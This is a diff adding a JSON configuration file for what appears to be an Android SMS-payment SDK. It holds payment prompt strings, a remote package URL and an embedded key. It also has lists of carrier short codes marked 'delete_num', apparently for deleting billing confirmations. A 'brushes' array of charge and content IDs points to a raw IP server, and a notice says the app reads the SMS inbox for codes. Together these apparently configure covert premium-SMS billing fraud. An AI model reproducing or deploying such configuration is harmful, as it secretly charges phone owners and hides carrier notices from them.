@@ -1,0 +1,97 @@
+{
+  "common": {
+    "support_phone": "400-1234567",
+    "upay_brand": "优贝支付",
+    "send_sms_timeout": "60000", 
+    "default_cd_time": "300000",
+    "polling_trade_time": "5000",
+    "request_planlist_time": "300000",
+    "place_holder": ""
+  },
+  "package": {
+    "url": "http://cdn.upay360.cn/pack.dat", 
+    "build_date": "2015-01-14 15:06:00",
+    "place_holder": ""
+  },
+  "zcwap": {
+    "tip_unit_name": "神仙道元宝",
+    "progress_text": "正在支付，请稍候...",
+    "get_mobile_num": "正在获取您的手机号，请稍候...",
+    "tip_read_sms": "正在等待下发短信验证码，本应用将会访问您的短信收件箱以读取验证码",
+    "tip_confirm_sms": "正在提交验证码，请稍候...",
+    "app": "cm",
+    "pid": "6001",
+    "key": "ff712db123dddcbdaa8f10910cbab5df",
+    "place_holder": ""
+  },
+  "wypj": {
+    "progress_text": "本应用将会发送$num条短信来完成支付，请稍候...",
+    "delete_num": "10658899",
+    "place_holder": ""
+  },
+  "he_danji": {
+    "progress_text": "本应用将会发送$num条短信来完成支付，请稍候...",
+    "delete_num": "10658899",
+    "place_holder": ""
+  },
+  "he_nc_wy": {
+    "progress_text": "本应用将会发送$num条短信来完成支付，请稍候...",
+    "delete_num": "10658899",
+    "place_holder": ""
+  },
+  "he_nc_dj": {
+    "progress_text": "本应用将会发送$num条短信来完成支付，请稍候...",
+    "delete_num": "10658899",
+    "place_holder": ""
+  },
+  "upay": {
+    "progress_text": "本应用将会发送$num条短信来完成支付，请稍候...",
+    "mp_reply_num": "1065889920001",
+    "mp_delay_reply_tag": "1",
+    "place_holder": ""
+  },
+  "rdosms": {
+    "progress_text": "本应用将会发送1条短信来完成支付，请稍候...",
+    "place_holder": ""
+  },
+  "ck_mdo": {
+    "progress_text": "本应用将会发送$num条短信来完成支付，请稍候...",
+    "delete_num": "10658077",
+    "place_holder": ""
+  },
+  "bj_rdo": {
+    "progress_text": "本应用将会发送1条短信来完成支付，请稍候...",
+    "delete_num": "10658080",
+    "place_holder": ""
+  },
+  "cmcc_mm_dj": {
+    "progress_text": "$mmpt",
+    "progress_text_regist": "本应用会根据信号情况发送1-3条短信来完成支付，请稍候...",
+    "progress_text_unregist": "正在支付，请稍候...",
+    "delete_num": "10658424",
+    "place_holder": ""
+  },
+  "dt_sms": {
+    "progress_text": "本应用将会发送$num条短信来完成支付，请稍候...",
+    "place_holder": ""
+  },
+  "delete_number": {
+    "num": "10669202&10655&1000188&10660078&10669133&1000588&10658424&10658080&10658077&10658899&10658008&1065817&10660078&1065556131&10658008101816898&106586855107&10660078&1065556131&10655477&1065556002027004900&10658099&10086901987&10659878999000&10655477&1180211",
+    "place_holder": ""
+  },
+  "he_danji_brushes": [{"cmd_key":"DJ_xmf_2","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"000053977002","pid":"2241021504-7504102085","cpId":"710578","contentId":"657810053978","channelId":"40932000"},
+             {"cmd_key":"DJ_sqs_2","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"006028973022","pid":"2241021504-1764851450","cpId":"772239","contentId":"623916011617","channelId":"10061005"},
+             {"cmd_key":"DJ_hazd_2","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"006043521004","pid":"2241021504-8748621422","cpId":"795063","contentId":"606316016925","channelId":"40405008"},
+             {"cmd_key":"DJ_hyqst_2","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"006034109002","pid":"2241021504-2117854424","cpId":"741052","contentId":"605216012918","channelId":"10373001"},
+             {"cmd_key":"DJ_xjtf2_2","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"000053973002","pid":"2241021504-1736602186","cpId":"710578","contentId":"657810053974","channelId":"40932000"},
+             {"cmd_key":"DJ_yyt_2","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"006039433001","pid":"2241021504-6757543876","cpId":"794300","contentId":"630016014983","channelId":"40932000"},
+             {"cmd_key":"DJ_sb_2","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"006043587003","pid":"2241021504-4000680612","cpId":"794521","contentId":"652116016991","channelId":"10061002"},
+             {"cmd_key":"DJ_cyxdj_2","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"006050922003","pid":"2241021504-5064374164","cpId":"795063","contentId":"606316020918","channelId":"40405016"},
+             {"cmd_key":"DJ_zdbwz_4","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"006050588004","pid":"2241021504-8667248285","cpId":"794183","contentId":"618316020738","channelId":"41107000"},
+             {"cmd_key":"DJ_rzsp_4","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"006050986004","pid":"2241021504-5201058740","cpId":"794183","contentId":"618316020951","channelId":"41107000"},
+             {"cmd_key":"DJ_mmddz_2","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"006038400001","pid":"2241021504-2622731454","cpId":"710578","contentId":"657816014539","channelId":"10061001"},
+             {"cmd_key":"DJ_jh_2","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"006053412002","pid":"2241021504-1564885135","cpId":"772358","contentId":"635816022353","channelId":"40932000"},
+             {"cmd_key":"DJ_jxj_2","version":"1.0.0.7","ip":"182.92.21.219:10789","chargeId":"006053401002","pid":"2241021504-2373230202","cpId":"772358","contentId":"635816022346","channelId":"40932000"}],
+
+  "update_date": "2015-01-14 15:06:00"
+}
